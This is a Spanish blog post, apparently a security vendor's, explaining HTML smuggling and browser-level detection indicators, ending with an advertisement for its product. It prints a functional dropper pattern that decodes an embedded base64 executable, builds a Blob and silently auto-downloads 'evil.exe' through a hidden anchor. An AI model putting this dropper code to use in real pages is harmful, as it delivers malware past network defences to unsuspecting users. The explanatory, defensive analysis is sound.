+++
title = 'Detección de HTML Smuggling'
date = 2024-06-21T17:04:20+02:00
draft = false
image = '/posts/html-smuggling/static/html-smuggling.png'
+++

## Introducción

El HTML smuggling es una táctica avanzada y sigilosa que aprovecha las características estándar de HTML5 y JavaScript para evitar la detección y distribuir troyanos de acceso remoto (RAT), malware bancario y otro software dañino. Este método está siendo cada vez más adoptado por grupos de hackers patrocinados por el estado y ciberdelincuentes para infiltrarse en gobiernos, individuos y empresas. Un ejemplo notable es el grupo NOBELIUM, que se cree que tiene vínculos con Rusia, y que ha utilizado HTML smuggling para atacar organizaciones gubernamentales y diplomáticas en todo el mundo. Investigadores de Microsoft han observado que el grupo NOBELIUM empleó archivos HTML maliciosos en una campaña llamada EnvyScout. Estos archivos actúan como dropper, capaces de desofuscar y escribir archivos ISO maliciosos en el sistema de la víctima.

## Cómo funciona el HTML Smuggling

Este malware se utiliza esencialmente para obtener el control de las máquinas de las víctimas, entregar payloads de manera efectiva y ejecutar ataques de ransomware.

En el HTML smuggling, el atacante utiliza un archivo HTML especialmente diseñado que contiene un script malicioso codificado. Cuando la víctima abre este archivo HTML malicioso en su navegador web, el navegador decodifica este script malicioso incrustado que, al ejecutarse, ensambla el payload en la máquina de la víctima. La principal ventaja para los actores de amenazas es que, en lugar de transmitir el payload a través de la red, el payload malicioso se ensambla en la máquina de la víctima. Esto hace que la técnica sea altamente evasiva, ya que puede eludir controles de seguridad estándar como proxies web, firewalls y gateways de correo electrónico. Dado que el payload solo se crea cuando el archivo HTML malicioso se carga en la máquina de la víctima a través del navegador web, las soluciones de seguridad solo ven tráfico HTML o JavaScript que puede ser aún más ofuscado para evadir la detección.

<img src="/posts/html-smuggling/static/HTMLsmuggling-1.jpg" alt="dónde están las piezas" style="display: block; margin-left: auto; margin-right: auto; width: 100%; height: auto;">

## Análisis del código

En este capítulo vamos a analizar una versión básica de un payload de HTML smuggling. [ver el código completo](https://github.com/SofianeHamlaoui/Pentest-Notes/blob/master/offensive-security/defense-evasion/file-smuggling-with-html-and-javascript.md)

#### Datos codificados en Base64

```javascript
//función de conversión
function base64ToArrayBuffer(base64) {
    var binary_string = window.atob(base64);
    var len = binary_string.length;

    var bytes = new Uint8Array(len);
    for (var i = 0; i < len; i++) {
        bytes[i] = binary_string.charCodeAt(i);
    }
    return bytes.buffer;
}

//malware.exe codificado en Base64
var file = 'TVqQAAMAAAAEAAAA//8AALgAA[...]nBkYgA=';
var data = base64ToArrayBuffer(file);
```

Como hemos observado, el archivo HTML malicioso puede distribuir malware en la máquina de la víctima a través de varios métodos. En este escenario, todo el payload malicioso está codificado en base64 e incrustado directamente dentro del archivo HTML. Podemos ver la variable `file` que contiene el payload.

La función `base64ToArrayBuffer` convierte el payload codificado en los bytes reales que componen el archivo malicioso.

Es importante destacar que los atacantes pueden idear métodos aún más complejos para distribuir malware. Por ejemplo, podrían dividir el payload en varias partes, recuperar partes de forma remota o utilizar diferentes estándares de codificación y técnicas de cifrado. Estas estrategias aumentan significativamente la probabilidad de eludir medidas de seguridad como proxies web, firewalls y gateways de correo electrónico.

#### Blob de JavaScript

```javascript
var blob = new Blob([data], {type: 'octet/stream'});
var fileName = 'evil.exe';
```

Este es el núcleo del ataque. El objeto Blob permite la creación de un archivo dentro del navegador utilizando código JavaScript. Así es como lo describe Mozilla:

```text
"La interfaz Blob representa un blob, que es un objeto similar a un archivo que contiene datos crudos e inmutables; pueden leerse como texto o datos binarios, o convertirse en un ReadableStream para que sus métodos puedan usarse para procesar los datos.
Los blobs pueden representar datos que no están necesariamente en un formato nativo de JavaScript. La interfaz File se basa en Blob, heredando la funcionalidad de blob y ampliándola para admitir archivos en el sistema del usuario."
```

<img src="/posts/html-smuggling/static/blob-struct.png" alt="dónde están las piezas" style="display: block; margin-left: auto; margin-right: auto; width: 100%; height: auto;">
<br>
Por lo tanto, en lugar de confiar en el servidor web para entregar un archivo, se puede crear un Blob localmente utilizando JavaScript. Por ejemplo, un archivo "evil.exe" que normalmente se descargaría desde un servidor, puede ensamblarse y descargarse directamente en el sistema objetivo utilizando una etiqueta de anclaje HTML con el atributo de descarga.

#### Descarga mediante anclaje HTML

```javascript 
if (window.navigator.msSaveOrOpenBlob) {
    window.navigator.msSaveOrOpenBlob(blob, fileName);
} else {
    var a = document.createElement('a');
    console.log(a);
    document.body.appendChild(a);
    a.style = 'display: none';
    var url = window.URL.createObjectURL(blob);
    a.href = url;
    a.download = fileName;
    a.click();
    window.URL.revokeObjectURL(url);
}
```

Este fragmento de código verifica si el navegador admite `msSaveOrOpenBlob`. Si es compatible (para versiones anteriores de Internet Explorer y Microsoft Edge), lo utiliza para guardar o abrir un objeto Blob (blob) con un nombre de archivo específico (fileName). Si no es compatible, crea un elemento `<a>` oculto en el documento, configura una URL Blob (url) para el objeto Blob (blob), asigna la URL al atributo href del elemento `<a>`, configura el atributo de descarga para especificar el nombre del archivo (fileName), simula un clic en el elemento `<a>` para activar la descarga y limpia al revocar la URL Blob (url).

En este punto, el archivo malicioso está almacenado en la máquina de la víctima.

### Comportamiento en el navegador

Ahora es fácil imaginar las numerosas formas en que un atacante puede idear para obtener un archivo malicioso y reconstruirlo directamente en la máquina de la víctima. Podemos ver esta etapa como una operación de alto nivel en la que el atacante manipula codificaciones, cadenas y varios recursos remotos e incrustados. Sin embargo, en un momento dado, deben utilizar API específicas del navegador (operación de bajo nivel) para ejecutar el ataque. ¡Aquí es donde podemos intervenir y tomar medidas!

#### Indicadores de compromiso a nivel de navegador

Cada técnica deja rastros, y en este caso, nuestros Indicadores de Compromiso (IOC) son proporcionados por el evento de creación del Blob. Este evento tiene varios parámetros y opciones, los más interesantes son el ArrayBuffer, que contiene el malware, y el tipo, que debe estar configurado como octet/stream.

<img src="/posts/html-smuggling/static/blob-event.png" alt="dónde están las piezas" style="display: block; margin-left: auto; margin-right: auto; width: 70%; height: auto;">
<br>
<img src="/posts/html-smuggling/static/buffer-array.png" alt="dónde están las piezas" style="display: block; margin-left: auto; margin-right: auto; width: 90%; height: auto;">
<br>
En esta etapa, el archivo malicioso ya no puede ser ofuscado, dividido o alterado de ninguna otra manera. Debe estar completamente cargado en la memoria, listo para ser descargado. Por lo tanto, es posible monitorear la asignación de memoria e identificar este tipo de archivo malicioso.

Después de esto, se crea un elemento de anclaje que apunta a una URL Blob con un parámetro de descarga y probablemente con un estilo `display:none`, seguido de un clic programático en él. Esta secuencia de acciones representa otro comportamiento específico que puede identificarse y monitorearse para detectar actividad maliciosa.

```html
<a href="blob:null/5f2c2f2a-0349-43d2-a6ec-276bd4efb082" download="evil.exe" style="display: none;"></a>
```

## Conclusión

En conclusión, el HTML smuggling representa un método sofisticado utilizado por adversarios cibernéticos para eludir las medidas de seguridad tradicionales y entregar payloads maliciosos directamente a usuarios desprevenidos. Al incrustar scripts codificados dentro de archivos HTML que parecen inofensivos, los atacantes pueden evadir la detección y ejecutar acciones dañinas en las máquinas de las víctimas. Esta técnica presenta riesgos significativos para individuos, empresas y gobiernos en todo el mundo.

En TeamFence, hemos realizado un análisis exhaustivo de las técnicas de HTML smuggling y comprendemos la importancia crítica de las medidas de defensa proactivas. Nuestra

 solución está diseñada para detectar y mitigar eficazmente estos ataques furtivos. Al aprovechar algoritmos de detección avanzados y capacidades de monitoreo en tiempo real, BrowserFence identifica comportamientos sospechosos asociados con el HTML smuggling, como la creación y manipulación de URL Blob y el ensamblaje de payloads maliciosos en la memoria.

Protege tu organización hoy con BrowserFence y mantente a la vanguardia en el panorama en constante evolución de las amenazas cibernéticas. Contáctanos para saber más sobre cómo BrowserFence puede defender tus activos digitales contra el HTML smuggling y garantizar un entorno informático seguro para tu empresa.

<ul class="pt-4 d-flex gaps g-3 justify-content-center  animated" data-animate="fadeInUp" data-delay=".9">
    <li>
        <a href="#" class="btn btn-md btn-grad" data-overlay="bg-theme-grad-alternet"
           style="position: relative; top: 50px;">Instalar BrowserFence</a>
    </li>
</ul>